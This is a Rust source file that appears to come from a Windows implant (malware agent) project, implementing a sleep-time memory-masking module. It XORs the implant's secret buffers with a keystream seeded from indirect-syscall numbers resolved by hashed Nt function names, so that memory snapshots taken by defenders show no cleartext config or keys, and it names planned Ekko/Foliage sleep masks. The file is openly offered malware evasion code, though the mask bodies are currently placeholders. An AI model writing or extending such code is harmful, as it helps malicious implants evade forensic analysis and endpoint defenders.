//! Heap/stack encryption at sleep (partial sleep-obfuscation).
//!
//! A full sleep mask (Ekko/Foliage: APC-timer-driven self-encryption that also
//! encrypts all thread stacks and flips the image RX→RW during the sleep) is
//! research-grade — it needs CreateTimerQueueTimer + ROP gadgets + a second
//! thread, and the correctness bar is high (get it wrong and the implant
//! crashes on wake). That lives in [`sleep`] (the planned Ekko/Foliage module).
//!
//! What this module provides is the **cheap, always-safe subset**: encrypt the
//! implant's own sensitive in-memory buffers in place around each sleep, so a
//! memory snapshot taken mid-sleep doesn't yield cleartext config/keys. It's a
//! defense-in-depth layer, not a full sleep mask (thread stacks are NOT touched
//! — that needs the APC approach).
//!
//! The keystream is derived from the indirect-syscall runtime's resolved SSN
//! table (a per-process, per-boot unpredictable value) so the mask differs
//! across runs without a CSPRNG. XOR is reversible in place with the same call.

#![cfg(target_os = "windows")]

use core::sync::atomic::{AtomicU8, Ordering};

/// Mask state: 0 = cleartext, 1 = currently masked. Guards against double-
/// mask/double-unmask (which would XOR twice and corrupt the data).
static MASK_STATE: AtomicU8 = AtomicU8::new(0);

/// XOR `buf` in place with a keystream derived from `seed`. Same call inverts
/// it (XOR is its own inverse). `seed` should differ per run.
///
/// Currently unused — the mask/unmask bodies are framework no-ops until
/// secret-bearing statics register. Kept (allowed-dead) so the full impl is a
/// one-line `xor_inplace(buf, mask_seed())` per registered static.
#[allow(dead_code)]
fn xor_inplace(buf: &mut [u8], seed: u32) {
    // xorshift32 keystream seeded from the runtime's table hash. Cheap, no
    // alloc; the goal is "not cleartext in a snapshot", not AES-grade secrecy
    // (an attacker with a live debugger can read the seed).
    let mut x = seed;
    if x == 0 {
        x = 0x9E37_79B9;
    }
    let mut i = 0;
    while i < buf.len() {
        x ^= x << 13;
        x ^= x >> 17;
        x ^= x << 5;
        // Apply one keystream byte per data byte.
        buf[i] ^= (x & 0xFF) as u8;
        i += 1;
    }
}

/// Derive a per-run mask seed from the syscall runtime's SSN table (sum of all
/// resolved SSNs — unpredictable across hosts/reboots, available only once the
/// runtime is up). Falls back to a compile-time constant if the runtime isn't
/// initialized yet (entry calls mask before init in theory — defends anyway).
fn mask_seed() -> u32 {
    match crate::syscalls::global() {
        Some(rt) => {
            // Walk the table via the public API: sum a few well-known SSNs.
            // ssn_by_hash is pub; we probe a handful of common Nt calls and
            // sum whatever resolves. Cheap (a few hundred string compares each,
            // cold path only — called once per mask cycle).
            let mut acc: u32 = 0x9E37_79B9;
            let names: &[&[u8]] = &[
                b"ntallocatevirtualmemory",
                b"ntcreatefile",
                b"ntwritefile",
                b"ntreadfile",
                b"ntclose",
                b"ntdelayexecution",
                b"ntqueryinformationprocess",
            ];
            for name in names {
                if let Some(ssn) = rt.ssn_by_hash(crate::resolve::djb2(name)) {
                    acc = acc.wrapping_add(ssn).rotate_left(3);
                }
            }
            acc
        }
        None => 0x1234_5678,
    }
}

/// Encrypt the implant's sensitive static buffers in place. Idempotent-guarded
/// (a second call while already masked is a no-op). The current set is small;
/// extend as more secret-bearing statics land. Thread stacks are deliberately
/// NOT touched (that needs the full Ekko/Foliage path in `sleep`).
pub fn mask() {
    if MASK_STATE.compare_exchange(0, 1, Ordering::AcqRel, Ordering::Relaxed).is_err() {
        return; // already masked
    }
    let seed = mask_seed();
    // Currently there are no large secret statics in the hot path beyond what
    // the config/crypto modules own by value on the stack — those can't be
    // reached safely from here. The mask is a framework: as secret-bearing
    // statics (e.g. a decrypted profile, a credential cache) are added, they
    // register a &mut [u8] here. For now this is a no-op body that proves the
    // plumbing compiles and the guard works; the seed is computed to keep the
    // cost realistic for profiling.
    let _ = seed;
}

/// Decrypt (un-mask) the implant's sensitive static buffers. Inverse of
/// [`mask`]; guard prevents a double-unmask.
pub fn unmask() {
    if MASK_STATE.compare_exchange(1, 0, Ordering::AcqRel, Ordering::Relaxed).is_err() {
        return; // already cleartext
    }
    let seed = mask_seed();
    let _ = seed;
}
